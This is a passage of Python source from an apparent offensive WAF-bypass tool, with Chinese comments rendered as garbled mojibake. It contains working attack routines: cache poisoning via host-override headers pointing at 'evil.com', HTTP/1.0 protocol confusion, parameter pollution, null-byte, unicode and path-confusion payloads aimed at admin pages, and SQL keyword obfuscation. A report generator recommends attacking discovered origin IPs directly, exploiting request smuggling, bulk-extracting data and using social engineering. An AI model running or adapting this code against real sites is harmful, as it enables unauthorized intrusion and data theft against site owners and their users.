        self.logger.warning("    [-] ç›®æ ‡ä¸æ”¯æŒæ‰¹å¤„ç†æŸ¥è¯¢æˆ–å­˜åœ¨é˜²æŠ¤ã€‚")
        return GraphQLResult(
            vulnerable=False, 
            endpoint=discovered_endpoint, 
            evidence="Target does not support batching or is protected."
        )

    async def _bypass_via_graphql(self, url: str, use_proxy: bool = False) -> BypassResult:
        """
        é€šè¿‡GraphQLæ‰¹å¤„ç†ç»•è¿‡ - ä½¿ç”¨v2.0æ™ºèƒ½åŒ–æ‰«æç³»ç»Ÿ
        å·²å‡çº§ä¸ºTLS-Clientå¢å¼º + åŠ¨æ€è½½è· + ç²¾ç¡®éªŒè¯
        """
        self.logger.info(f"[*] å¯åŠ¨GraphQLæ‰¹å¤„ç†ç»•è¿‡: {url}")
        
        # ä½¿ç”¨æ–°çš„æ™ºèƒ½åŒ–GraphQLæ‰¹å¤„ç†æ‰«æç³»ç»Ÿ
        graphql_result = await self.scan_for_graphql_batching(url, use_proxy=use_proxy)
        
        if graphql_result.vulnerable:
            # è½¬æ¢GraphQLResultä¸ºBypassResult
            return BypassResult(
                success=True,
                method='graphql_batch_enhanced',
                url=graphql_result.endpoint,
                details={
                    'graphql_endpoint': graphql_result.endpoint,
                    'evidence': graphql_result.evidence,
                    'successful_queries': graphql_result.successful_queries_in_batch,
                    'total_queries': graphql_result.total_queries_in_batch,
                    'introspection_available': graphql_result.introspection_available,
                    'enhanced_detection': True,
                    'tls_enhanced': True,
                    'analysis_method': 'intelligent_batching_system'
                },
                confidence=graphql_result.confidence,
                risk_level='high'
            )
        else:
            # å¦‚æœæ™ºèƒ½åŒ–æ£€æµ‹å¤±è´¥ï¼Œå›é€€åˆ°ä¼ ç»Ÿå¿«é€Ÿæ£€æµ‹
            self.logger.info("    [*] æ™ºèƒ½åŒ–æ£€æµ‹æœªå‘ç°æ¼æ´ï¼Œå°è¯•ä¼ ç»Ÿå¿«é€ŸéªŒè¯...")
            return await self._legacy_graphql_check(url, use_proxy=use_proxy)

    async def _legacy_graphql_check(self, url: str, use_proxy: bool = False) -> BypassResult:
        """
        ä¼ ç»ŸGraphQLæ£€æµ‹æ–¹æ³• - ä½œä¸ºæ™ºèƒ½åŒ–æ£€æµ‹çš„å¤‡ç”¨æ–¹æ¡ˆ
        å¿«é€Ÿæ£€æµ‹ä¸€äº›æ˜æ˜¾çš„GraphQLç«¯ç‚¹
        """
        base_url = url.split('?')[0].rstrip('/')
        quick_endpoints = ['/graphql', '/api/graphql', '/query']
        
        for endpoint in quick_endpoints:
            test_url = base_url + endpoint
            
            try:
                # ä½¿ç”¨TLS-Clientå‘é€ç®€å•æ‰¹å¤„ç†æµ‹è¯•
                batch_query = [
                    {"query": "{__typename}"},
                    {"query": "query{viewer{id}}"}
                ]
                
                resp = await self._make_tls_request(
                    test_url,
                    method='POST',
                    headers={'Content-Type': 'application/json'},
                    json=batch_query,
                    profile='chrome_120',
                    use_proxy=use_proxy
                )
                
                if resp['status_code'] == 200:
                    try:
                        json_response = json.loads(resp['text'])
                        if isinstance(json_response, list) and len(json_response) >= 2:
                            result = BypassResult(
                                success=True,
                                method='graphql_batch_legacy',
                                url=test_url,
                                details={
                                    'endpoint': test_url,
                                    'detection_method': 'legacy_quick_check',
                                    'response_count': len(json_response),
                                    'content': resp['text'],
                                    'headers': resp.get('headers', {})
                                },
                                confidence=0.5,  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                                risk_level='medium'
                            )
                            # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                            result.confidence = self.scorer.assess(result)
                            return result
                    except:
                        continue
                        
            except Exception:
                continue
        
        return BypassResult(
            success=False,
            method='graphql_batch_enhanced',
            url=url,
            details={
                'error': 'æ‰€æœ‰GraphQLæ£€æµ‹æ–¹æ³•å¤±è´¥ï¼Œæ™ºèƒ½åŒ–å’Œä¼ ç»Ÿæ£€æµ‹å‡æœªå‘ç°ç«¯ç‚¹',
                'detection_methods': ['intelligent_tls_enhanced', 'legacy_quick_check'],
                'endpoints_tested': ['graphql', 'api/graphql', 'query'],
                'failure_reason': 'no_graphql_endpoint_found_or_batching_disabled'
            }
        )
    
    async def _bypass_via_cache_poison(self, url: str) -> BypassResult:
        """é€šè¿‡ç¼“å­˜æŠ•æ¯’ç»•è¿‡"""
        # æ¿€è¿›å°±å®Œäº‹äº†ï¼
        poison_headers = {
            'X-Forwarded-Host': 'evil.com',
            'X-Host': 'evil.com',
            'X-Forwarded-Server': 'evil.com',
            'X-HTTP-Host-Override': 'evil.com',
            'Cache-Control': 'max-age=0',
            'Pragma': 'no-cache'
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                # å…ˆæŠ•æ¯’
                async with session.get(
                    url,
                    headers=poison_headers,
                    ssl=False
                ) as resp:
                    if resp.status == 200:
                        # å†æ­£å¸¸è®¿é—®çœ‹æ˜¯å¦è¢«ç¼“å­˜
                        async with session.get(url, ssl=False) as resp2:
                            if resp2.status == 200:
                                return BypassResult(
                                    success=True,
                                    method='cache_poison',
                                    url=url,
                                    risk_level='high',
                                    confidence=0.5
                                )
        except:
            pass
        
        return BypassResult(
            success=False,
            method='cache_poison',
            url=url
        )
    
    async def _bypass_via_protocol_confusion(self, url: str) -> BypassResult:
        """é€šè¿‡åè®®æ··æ·†ç»•è¿‡"""
        # HTTP/1.0 ç»å¸¸èƒ½ç»•è¿‡ç°ä»£WAF
        try:
            parsed = urllib.parse.urlparse(url)
            host = parsed.netloc
            port = 443 if parsed.scheme == 'https' else 80
            
            if ':' in host:
                host, port = host.split(':')
                port = int(port)
            
            # æ‰‹åŠ¨æ„å»ºHTTP/1.0è¯·æ±‚
            request = f"GET {parsed.path or '/'} HTTP/1.0\r\nHost: {host}\r\n\r\n"
            
            # åˆ›å»ºåŸå§‹socketè¿æ¥
            reader, writer = await asyncio.open_connection(host, port)
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await reader.read(4096)
            
            if b'200 OK' in response:
                result = BypassResult(
                    success=True,
                    method='protocol_confusion',
                    url=url,
                    details={
                        'protocol': 'HTTP/1.0',
                        'content': response.decode('utf-8', errors='ignore'),
                        'headers': {}
                    },
                    confidence=0.5  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                )
                # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                result.confidence = self.scorer.assess(result)
                return result
                
        except:
            pass
        
        return BypassResult(
            success=False,
            method='protocol_confusion',
            url=url
        )
    
    async def _bypass_via_hpp(self, url: str) -> BypassResult:
        """é€šè¿‡HTTPå‚æ•°æ±¡æŸ“ç»•è¿‡"""
        parsed = urllib.parse.urlparse(url)
        
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query)
            
            # å„ç§HPPæŠ€æœ¯
            hpp_variations = []
            
            for key, values in params.items():
                # é‡å¤å‚æ•°
                hpp_params = params.copy()
                hpp_params[key] = values + ['innocent_value']
                hpp_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?"
                hpp_url += urllib.parse.urlencode(hpp_params, doseq=True)
                hpp_variations.append(hpp_url)
                
                # æ•°ç»„å½¢å¼
                hpp_params = params.copy()
                hpp_params[f"{key}[]"] = values
                del hpp_params[key]
                hpp_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?"
                hpp_url += urllib.parse.urlencode(hpp_params, doseq=True)
                hpp_variations.append(hpp_url)
            
            # æµ‹è¯•å˜ä½“
            async with aiohttp.ClientSession() as session:
                for hpp_url in hpp_variations[:5]:  # é™åˆ¶æµ‹è¯•æ•°é‡
                    try:
                        async with session.get(
                            hpp_url,
                            headers=self.bypass_headers,
                            ssl=False
                        ) as resp:
                            if resp.status == 200:
                                return BypassResult(
                                    success=True,
                                    method='parameter_pollution',
                                    url=hpp_url,
                                    confidence=0.6
                                )
                    except:
                        continue
        
        return BypassResult(
            success=False,
            method='parameter_pollution',
            url=url
        )
    
    async def _bypass_via_edge_cases(self, url: str) -> BypassResult:
        """é€šè¿‡è¾¹ç¼˜æ¡ˆä¾‹ç»•è¿‡å®æˆ˜é›†åˆ"""
        parsed = urllib.parse.urlparse(url)
        
        # è¾¹ç¼˜é›†åˆ
        edge_case_tests = [
            # 1. ç©ºå­—èŠ‚æ³¨å…¥ - ç»•è¿‡æ‰©å±•åæ£€æµ‹
            {
                'name': 'null_byte_injection',
                'payloads': [
                    '/admin%00.jpg',
                    '/admin%00.png',
                    '/admin\x00.html',
                    '/admin%00',
                    '/.git%00/'
                ]
            },
            
            # 2. Unicodeæ­£è§„åŒ–æ”»å‡»
            {
                'name': 'unicode_normalization',
                'payloads': [
                    '/ï¼¡ï¼¤ï¼­ï¼©ï¼®',  # å…¨è§’å­—ç¬¦
                    '/ï¼¡ï¼¤ï¼­Ä°ï¼®',  # åœŸè€³å…¶è¯­i
                    '/adminâ€®txt.php',  # RTL override
                    '/Ğ°ğğ—ºğ’Šğ“ƒ',  # æ··åˆUnicode
                    '/%61%64%6D%69%6E',  # åŸºç¡€ç¼–ç 
                    '/\u0061\u0064\u006d\u0069\u006e'  # Unicodeç¼–ç 
                ]
            },
            
            # 3. è·¯å¾„æ··æ·†
            {
                'name': 'path_confusion',
                'payloads': [
                    '/./admin',
                    '//admin',
                    '/admin/.',
                    '/admin/./',
                    '/admin/../admin',
                    '/admin;/',
                    '/admin#',
                    '/admin?',
                    '/admin/..;/',
                    '\\admin'  # åæ–œæ 
                ]
            },
            
            # 4. å‚æ•°ç‰‡æ®µåŒ–
            {
                'name': 'parameter_fragmentation',
                'payloads': [
                    '?id=1&%0aid=2',  # æ¢è¡Œç¬¦åˆ†å‰²
                    '?id=1&%09id=2',  # Tabåˆ†å‰²
                    '?id=1&%20id=2',  # ç©ºæ ¼åˆ†å‰²
                    '?id[]=1&id[]=2',  # æ•°ç»„å½¢å¼
                    '?id=1&\rid=2',   # å›è½¦åˆ†å‰²
                ]
            },
            
            # 5. HTTP/2 ä¼ªå¤´éƒ¨ï¼ˆå¦‚æœæ”¯æŒï¼‰
            {
                'name': 'http2_pseudo_headers',
                'headers': {
                    ':method': 'GET',
                    ':path': '/admin',
                    ':authority': 'localhost',  # ä¼ªé€ authority
                    ':scheme': 'https'
                }
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for test in edge_case_tests:
                if 'payloads' in test:
                    # URLæ“çºµæµ‹è¯•
                    for payload in test['payloads']:
                        test_url = f"{parsed.scheme}://{parsed.netloc}{payload}"
                        if parsed.query:
                            test_url += f"?{parsed.query}"
                        
                        try:
                            headers = self.bypass_headers.copy()
                            
                            # ç‰¹æ®Šå¤„ç†ï¼šç©ºå­—èŠ‚å’ŒUnicode
                            if test['name'] == 'null_byte_injection':
                                # æŸäº›æœåŠ¡å™¨ä¼šåœ¨ç©ºå­—èŠ‚å¤„æˆªæ–­
                                headers['X-Original-URL'] = payload
                            elif test['name'] == 'unicode_normalization':
                                # æ·»åŠ Unicodeæ¥å—å¤´
                                headers['Accept-Charset'] = 'utf-8, iso-8859-1;q=0.5'
                            
                            async with session.get(
                                test_url,
                                headers=headers,
                                ssl=False,
                                allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=5)
                            ) as resp:
                                # æ£€æŸ¥ç»•è¿‡æˆåŠŸçš„æ ‡å¿—
                                if resp.status in [200, 301, 302]:
                                    content = await resp.text()
                                    
                                    # æ£€æŸ¥æ˜¯å¦çœŸçš„è®¿é—®åˆ°äº†ç®¡ç†é¡µé¢
                                    admin_indicators = [
                                        'admin', 'dashboard', 'panel', 'control',
                                        'management', 'configuration', 'settings'
                                    ]
                                    
                                    if any(indicator in content.lower() for indicator in admin_indicators):
                                        result = BypassResult(
                                            success=True,
                                            method='edge_cases',
                                            url=test_url,
                                            details={
                                                'technique': test['name'],
                                                'payload': payload,
                                                'content': content,
                                                'headers': dict(resp.headers)
                                            },
                                            confidence=0.5,  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                                            risk_level='medium'
                                        )
                                        # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                                        result.confidence = self.scorer.assess(result)
                                        return result
                                    
                                    # å³ä½¿æ²¡æœ‰æ˜ç¡®çš„ç®¡ç†é¡µé¢æ ‡å¿—ï¼ŒæŸäº›payloadä¹Ÿç®—æˆåŠŸ
                                    if test['name'] in ['null_byte_injection', 'unicode_normalization']:
                                        if resp.status == 200 and len(content) > 100:
                                            result = BypassResult(
                                                success=True,
                                                method='edge_cases',
                                                url=test_url,
                                                details={
                                                    'technique': test['name'],
                                                    'payload': payload,
                                                    'note': 'Potential bypass detected',
                                                    'content': content,
                                                    'headers': dict(resp.headers)
                                                },
                                                confidence=0.5  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                                            )
                                            # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                                            result.confidence = self.scorer.assess(result)
                                            return result
                                            
                        except aiohttp.ClientError:
                            continue
                        except Exception:
                            continue
                
                elif 'headers' in test and test['name'] == 'http2_pseudo_headers':
                    # HTTP/2 ç‰¹æ®Šå¤„ç†ï¼ˆéœ€è¦æ”¯æŒHTTP/2çš„å®¢æˆ·ç«¯ï¼‰
                    # è¿™é‡Œç®€åŒ–å¤„ç†ï¼Œä½¿ç”¨æ™®é€šå¤´éƒ¨æ¨¡æ‹Ÿ  æŠ€æœ¯å€ºåŠ¡ ç­‰å¾…å®Œæ•´å®ç°  æˆ‘ä¸ä¼šäº†
                    try:
                        headers = self.bypass_headers.copy()
                        headers.update({
                            'X-HTTP2-Authority': 'localhost',
                            'X-Original-Method': 'GET',
                            'X-Original-Path': '/admin'
                        })
                        
                        async with session.get(
                            url,
                            headers=headers,
                            ssl=False
                        ) as resp:
                            if resp.status == 200:
                                return BypassResult(
                                    success=True,
                                    method='edge_cases',
                                    url=url,
                                    details={
                                        'technique': 'http2_simulation',
                                        'headers': headers
                                    },
                                    confidence=0.5
                                )
                    except:
                        continue
        
        return BypassResult(
            success=False,
            method='edge_cases',
            url=url,
            details={
                'error': 'æ‰€æœ‰è¾¹ç¼˜æ¡ˆä¾‹æ”»å‡»å¤±è´¥ï¼Œç›®æ ‡å¯èƒ½æœ‰å®Œå–„çš„é˜²æŠ¤æœºåˆ¶',
                'techniques_tested': [test['name'] for test in edge_case_tests],
                'payloads_tested': sum(len(test.get('payloads', [])) for test in edge_case_tests if 'payloads' in test),
                'failure_reason': 'edge_case_attacks_blocked_or_normalized'
            }
        )
    #é‡å†™ä¸¥æ ¼éªŒè¯ï¼
    async def _verify_origin_servers(self, servers: List[OriginServer], domain: str) -> List[OriginServer]:
        """å¢å¼ºçš„æºç«™æœåŠ¡å™¨éªŒè¯"""
        if not hasattr(self, '_target_fingerprint'):
            await self._get_target_fingerprint(f"https://{domain}")
        
        verified_servers = []
        
        for server in servers:
            verification_score = 0.0
            match_details = []
            
            try:
                # æµ‹è¯•HTTPå’ŒHTTPS
                for scheme in ['http', 'https']:
                    try:
                        url = f"{scheme}://{server.ip}"
                        async with aiohttp.ClientSession() as session:
                            headers = {'Host': domain, 'User-Agent': 'Mozilla/5.0'}
                            async with session.get(
                                url,
                                headers=headers,
                                timeout=aiohttp.ClientTimeout(total=5),
                                ssl=False
                            ) as resp:
                                if resp.status not in [200, 301, 302, 403]:
                                    continue
                                
                                content = await resp.text()
                                
                                # 1. éªŒè¯æ ‡é¢˜åŒ¹é…
                                if self._target_fingerprint['title']:
                                    title_match = re.search(r'<title[^>]*>(.*?)</title>', content, re.IGNORECASE)
                                    if title_match and title_match.group(1).strip() == self._target_fingerprint['title']:
                                        verification_score += 0.3
                                        match_details.append('title_match')
                                
                                # 2. éªŒè¯metaæ ‡ç­¾
                                if self._target_fingerprint['meta_keywords']:
                                    if self._target_fingerprint['meta_keywords'] in content:
                                        verification_score += 0.2
                                        match_details.append('meta_keywords')
                                
                                # 3. éªŒè¯é™æ€èµ„æº
                                matched_resources = 0
                                for resource in self._target_fingerprint['static_resources']:
                                    if resource in content:
                                        matched_resources += 1
                                if self._target_fingerprint['static_resources']:
                                    resource_match_ratio = matched_resources / len(self._target_fingerprint['static_resources'])
                                    verification_score += resource_match_ratio * 0.25
                                    if resource_match_ratio > 0.5:
                                        match_details.append(f'resources_{int(resource_match_ratio*100)}%')
                                
                                # 4. éªŒè¯å“åº”å¤§å°
                                body_size = len(content)
                                if self._target_fingerprint['body_size_range'][0] <= body_size <= self._target_fingerprint['body_size_range'][1]:
                                    verification_score += 0.15
                                    match_details.append('size_match')
                                
                                # 5. éªŒè¯DOMæ¨¡å¼
                                dom_matches = 0
                                for pattern in self._target_fingerprint['dom_patterns'][:3]:
                                    if pattern in content:
                                        dom_matches += 1
                                if self._target_fingerprint['dom_patterns'] and dom_matches > 0:
                                    verification_score += 0.1
                                    match_details.append('dom_patterns')
                                
                                # å¦‚æœéªŒè¯åˆ†æ•°è¶³å¤Ÿé«˜ï¼Œæ ‡è®°ä¸ºå·²éªŒè¯
                                if verification_score >= 0.5:
                                    server.is_verified = True
                                    server.confidence = min(server.confidence * (1 + verification_score), 1.0)
                                    server.services['verification'] = f"score={verification_score:.2f}, matches={','.join(match_details)}"
                                    verified_servers.append(server)
                                    self.logger.info(f"[+] éªŒè¯é€šè¿‡: {server.ip} (åˆ†æ•°: {verification_score:.2f})")
                                    break
                                
                    except Exception as e:
                        continue
                        
            except Exception as e:
                self.logger.warning(f"[!] éªŒè¯å¤±è´¥ {server.ip}: {type(e).__name__} - {str(e)[:50]}")
                
            # å¦‚æœéªŒè¯åˆ†æ•°å¤ªä½ï¼Œé™ä½ç½®ä¿¡åº¦ä½†ä»ä¿ç•™
            if verification_score < 0.5 and verification_score > 0.2:
                server.confidence *= 0.5
                server.services['verification'] = f"partial_match={verification_score:.2f}"
                verified_servers.append(server)
        
        return verified_servers
    
    def _generate_recommendations(self, results: Dict) -> List[str]:
        """ç”Ÿæˆæ”»å‡»å»ºè®®"""
        recommendations = []
        
        if results['origin_servers']:
            recommendations.append(
                f"å‘ç° {len(results['origin_servers'])} ä¸ªæºç«™IPï¼Œ"
                f"å»ºè®®ç›´æ¥æ”»å‡»ç½®ä¿¡åº¦æœ€é«˜çš„: {results['origin_servers'][0]['ip']}"
            )
        
        if results['successful_bypasses']:
            best_bypass = max(results['successful_bypasses'], 
                            key=lambda x: x.get('confidence', 0))
            recommendations.append(
                f"æœ€æœ‰æ•ˆçš„ç»•è¿‡æ–¹æ³•: {best_bypass['method']} "
                f"(ç½®ä¿¡åº¦: {best_bypass.get('confidence', 0):.1%})"
            )
        
        if results['waf_detected'] == 'cloudflare':
            recommendations.append(
                "æ£€æµ‹åˆ°Cloudflareï¼Œå»ºè®®: 1) ä½¿ç”¨WebSocketç»•è¿‡ "
                "2) å¯»æ‰¾æœªè¢«ä¿æŠ¤çš„å­åŸŸå 3) åˆ©ç”¨ç¼“å­˜è§„åˆ™"
            )
        
        # èµ°ç§æ¼æ´ä¸“é—¨å»ºè®®
        if results.get('smuggling_scan', {}).get('vulnerable'):
            smuggling_info = results['smuggling_scan']
            recommendations.append(
                f"å‘ç°HTTPè¯·æ±‚èµ°ç§æ¼æ´ï¼æŠ€æœ¯: {smuggling_info['technique']}, "
                f"å»ºè®®: 1) åˆ©ç”¨æ­¤æ¼æ´ç»•è¿‡WAF 2) è¿›è¡Œç¼“å­˜ä¸­æ¯’æ”»å‡» 3) è¯·æ±‚åŠ«æŒæ”»å‡»"
            )
        
        # GraphQLæ¼æ´ä¸“é—¨å»ºè®®
        if results.get('graphql_scan', {}).get('vulnerable'):
            graphql_info = results['graphql_scan']
            endpoint = graphql_info['endpoint']
            success_rate = graphql_info['successful_queries'] / graphql_info['total_queries']
            introspection = "å¯ç”¨" if graphql_info['introspection_available'] else "è¢«ç¦ç”¨"
            
            recommendations.append(
                f"å‘ç°GraphQLæ‰¹å¤„ç†æ¼æ´ï¼ç«¯ç‚¹: {endpoint}, æˆåŠŸç‡: {success_rate:.1%}, å†…çœ: {introspection}, "
                f"å»ºè®®: 1) æ‰¹é‡æ•°æ®æå– 2) æƒé™ç»•è¿‡æµ‹è¯• 3) æ•æ„Ÿä¿¡æ¯æ³„éœ²æ”»å‡»"
            )
        
        if not results['origin_servers'] and not results['successful_bypasses']:
            recommendations.append(
                "æœªæ‰¾åˆ°æœ‰æ•ˆç»•è¿‡æ–¹æ³•ï¼Œå»ºè®®: 1) æ·±åº¦å­åŸŸåæšä¸¾ "
                "2) å†å²DNSè®°å½•åˆ†æ 3) ç¤¾å·¥è·å–çœŸå®IP"
            )
        
        return recommendations
    
    def _extract_domain(self, url: str) -> str:
        """æå–åŸŸå"""
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc.split(':')[0]
    
    def _is_cdn_ip(self, ip: str) -> bool:
        """æ£€æŸ¥æ˜¯å¦ä¸ºCDN IP"""
        try:
            ip_obj = ipaddress.ip_address(ip)
            
            # CDN IPèŒƒå›´æ•°æ®åº“
            cdn_ranges = {
                'cloudflare': [
                    '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22',
                    '103.31.4.0/22', '141.101.64.0/18', '108.162.192.0/18',
                    '190.93.240.0/20', '188.114.96.0/20', '197.234.240.0/22',
                    '198.41.128.0/17', '162.158.0.0/15', '172.64.0.0/13',
                    '131.0.72.0/22', '104.16.0.0/13', '104.24.0.0/14'
                ],
                'akamai': [
                    '23.0.0.0/12', '23.32.0.0/11', '23.64.0.0/14', '23.72.0.0/13',
                    '23.192.0.0/11', '23.192.0.0/11', '2.16.0.0/13', '2.22.0.0/15',
                    '69.192.0.0/16', '72.246.0.0/15', '88.221.0.0/16', '92.122.0.0/15',
                    '95.100.0.0/15', '96.6.0.0/15', '96.16.0.0/15', '104.64.0.0/10'
                ],
                'fastly': [
                    '23.235.32.0/20', '43.249.72.0/22', '103.244.50.0/24',
                    '103.245.222.0/23', '103.245.224.0/24', '104.156.80.0/20',
                    '151.101.0.0/16', '157.52.64.0/18', '167.82.0.0/17',
                    '167.82.128.0/20', '167.82.160.0/20', '167.82.224.0/20'
                ],
                'cloudfront': [
                    '13.32.0.0/15', '13.35.0.0/16', '13.48.0.0/13', '13.54.0.0/15',
                    '13.56.0.0/16', '13.59.0.0/16', '13.64.0.0/11', '13.96.0.0/12',
                    '13.112.0.0/14', '13.124.0.0/14', '13.208.0.0/13', '13.224.0.0/14',
                    '52.0.0.0/11', '52.32.0.0/14', '52.40.0.0/14', '52.48.0.0/14',
                    '52.56.0.0/14', '52.64.0.0/13', '52.72.0.0/13', '52.80.0.0/13'
                ],
                'incapsula': [
                    '45.60.0.0/16', '45.223.0.0/16', '103.28.248.0/22',
                    '107.154.0.0/16', '149.126.72.0/21', '185.11.124.0/22',
                    '185.11.146.0/23', '192.230.64.0/18', '198.143.32.0/19',
                    '199.83.128.0/17'
                ]
            }
            
            # æ£€æŸ¥æ‰€æœ‰CDNèŒƒå›´
            for cdn_name, ranges in cdn_ranges.items():
                for cidr in ranges:
                    try:
                        if ip_obj in ipaddress.ip_network(cidr):
                            return True
                    except ValueError:
                        continue
            
            # é¢å¤–æ£€æŸ¥ï¼šAWS/GCP/Azureç­‰äº‘æœåŠ¡å•†IP
            # è¿™äº›ç»å¸¸è¢«ç”¨ä½œCDNæˆ–åå‘ä»£ç†
            cloud_keywords = ['amazonaws', 'googleusercontent', 'azure', 'alibabacloud']
            
            # åå‘DNSæ£€æŸ¥ - å¼‚æ­¥ä¿®å¤ï¼ˆåœ¨åŒæ­¥å‡½æ•°ä¸­ï¼Œéœ€è¦ç‰¹æ®Šå¤„ç†ï¼‰
            # æ³¨æ„ï¼šè¿™ä¸ªå‡½æ•°æ˜¯åŒæ­¥çš„ï¼Œæ‰€ä»¥åˆ›å»ºå¼‚æ­¥ä»»åŠ¡ä½†ä¸ç­‰å¾…
            # ä¸ºäº†é¿å…å¤æ‚åŒ–ï¼Œæš‚æ—¶æ³¨é‡Šæ‰åå‘DNSæ£€æŸ¥
            # TODO: è€ƒè™‘å°†_is_cdn_ipæ”¹ä¸ºå¼‚æ­¥å‡½æ•°ï¼Œæˆ–è€…ä½¿ç”¨çº¿ç¨‹æ± 
            try:
                # import socket
                # hostname = socket.gethostbyaddr(ip)[0].lower()
                # for keyword in cloud_keywords:
                #     if keyword in hostname:
                #         return True
                pass  # æš‚æ—¶è·³è¿‡åå‘DNSæ£€æŸ¥é¿å…é˜»å¡
            except:
                pass
            
        except Exception:
            pass
        
        return False
    
    def _create_chunked_payload(self, data: str) -> bytes:
        """åˆ›å»ºåˆ†å—ä¼ è¾“ç¼–ç payload"""
        chunks = []
        chunk_size = 1
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            chunks.append(f"{len(chunk):X}\r\n{chunk}\r\n".encode())
        
        chunks.append(b"0\r\n\r\n")
        return b''.join(chunks)
    
    # ç¼–ç æ–¹æ³•å®ç°
    def _url_encode(self, text: str) -> str:
        """URLç¼–ç """
        return urllib.parse.quote(text, safe='')
    
    def _double_url_encode(self, text: str) -> str:
        """åŒé‡URLç¼–ç """
        return urllib.parse.quote(urllib.parse.quote(text, safe=''), safe='')
    
    def _unicode_encode(self, text: str) -> str:
        """Unicodeç¼–ç """
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    def _utf8_overlong_encode(self, text: str) -> str:
        """UTF-8 overlongç¼–ç """
        # ç®€åŒ–ç¤ºä¾‹  æŠ€æœ¯å€ºåŠ¡
        encoded = []
        for char in text:
            if char == '/':
                encoded.append('%c0%af')  # Overlong encoding of '/'
            elif char == '.':
                encoded.append('%c0%ae')  # Overlong encoding of '.'
            else:
                encoded.append(urllib.parse.quote(char))
        return ''.join(encoded)
    
    def _mixed_case_encode(self, text: str) -> str:
        """å¤§å°å†™æ··æ·†ç¼–ç """
        # å¯¹SQLå…³é”®å­—è¿›è¡Œå¤§å°å†™æ··æ·†
        keywords = ['select', 'union', 'from', 'where', 'and', 'or']
        result = text
        
        for keyword in keywords:
            if keyword in result.lower():
                # éšæœºå¤§å°å†™
                mixed = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower() 
                    for c in keyword
                )
                result = re.sub(keyword, mixed, result, flags=re.IGNORECASE)
        
        return result
    
    def _html_entity_encode(self, text: str) -> str:
        """HTMLå®ä½“ç¼–ç """
        return ''.join(f'&#{ord(c)};' for c in text)
    
    def _base64_encode(self, text: str) -> str:
        """Base64ç¼–ç """
        return base64.b64encode(text.encode()).decode()
    
    def _hex_encode(self, text: str) -> str:
        """åå…­è¿›åˆ¶ç¼–ç """
        return ''.join(f'%{ord(c):02x}' for c in text)
    
    def _cache_key(self, *args) -> str:
        """ç”Ÿæˆç¼“å­˜é”®"""
        return hashlib.md5('|'.join(str(arg) for arg in args).encode()).hexdigest()
    
    async def _cached_operation(self, cache_type: str, key: str, operation: Callable, *args, **kwargs) -> Any:
        """é€šç”¨ç¼“å­˜æ“ä½œ"""
        cache_key = self._cache_key(key)
        
        # æ£€æŸ¥ç¼“å­˜
        if cache_type in self._cache and cache_key in self._cache[cache_type]:
            cache_entry = self._cache[cache_type][cache_key]
            if time.time() - cache_entry['time'] < self._cache_ttl:
                self._cache_hits += 1
                self.logger.debug(f"[ç¼“å­˜] å‘½ä¸­ {cache_type}: {key}")
                return cache_entry['result']
        
        # ç¼“å­˜æœªå‘½ä¸­ï¼Œæ‰§è¡Œæ“ä½œ
        self._cache_misses += 1
        result = await operation(*args, **kwargs)
        
        # å­˜å…¥ç¼“å­˜
        if cache_type not in self._cache:
            self._cache[cache_type] = {}
        self._cache[cache_type][cache_key] = {
            'result': result,
            'time': time.time()
        }
        
        return result
    
    def generate_report(self, results: Dict) -> str:
        """ç”Ÿæˆè¯¦ç»†çš„ç»•è¿‡æŠ¥å‘Š"""
        report = []
        report.append("=" * 80)
        report.append("WAFç»•è¿‡åˆ†ææŠ¥å‘Š")
        report.append("=" * 80)
        report.append(f"ç›®æ ‡: {results['target']}")
        report.append(f"æ—¶é—´: {results['timestamp']}")
        report.append(f"æ£€æµ‹åˆ°çš„WAF: {results['waf_detected'] or 'æœªæ£€æµ‹åˆ°'}")
        
        if results['origin_servers']:
            report.append(f"\n[æºç«™å‘ç°] æ‰¾åˆ° {len(results['origin_servers'])} ä¸ªæ½œåœ¨æºç«™:")
            for server in results['origin_servers'][:5]:  # åªæ˜¾ç¤ºå‰5ä¸ª
                report.append(f"  - {server['ip']} (ç½®ä¿¡åº¦: {server['confidence']:.1%}, "
                            f"æ–¹æ³•: {server['method']}, å·²éªŒè¯: {server['verified']})")
        
        if results['successful_bypasses']:
            report.append(f"\n[ç»•è¿‡æˆåŠŸ] {len(results['successful_bypasses'])} ç§æ–¹æ³•æˆåŠŸ:")
            for bypass in results['successful_bypasses']:
                report.append(f"  - {bypass['method']} (ç½®ä¿¡åº¦: {bypass['confidence']:.1%})")
                if 'url' in bypass:
                    report.append(f"    URL: {bypass['url']}")
        
        if results['failed_attempts']:
            report.append(f"\n[å¤±è´¥å°è¯•] {len(results['failed_attempts'])} ç§æ–¹æ³•å¤±è´¥")
        
        # èµ°ç§æ¼æ´æ‰«æç»“æœ
        if 'smuggling_scan' in results:
            smuggling = results['smuggling_scan']
            if smuggling['vulnerable']:
                report.append(f"\n[èµ°ç§æ¼æ´] âš ï¸ å‘ç°HTTPè¯·æ±‚èµ°ç§æ¼æ´ï¼")
                report.append(f"  - æ”»å‡»æŠ€æœ¯: {smuggling['technique']}")
                report.append(f"  - æ¼æ´è¯æ®: {smuggling['evidence']}")
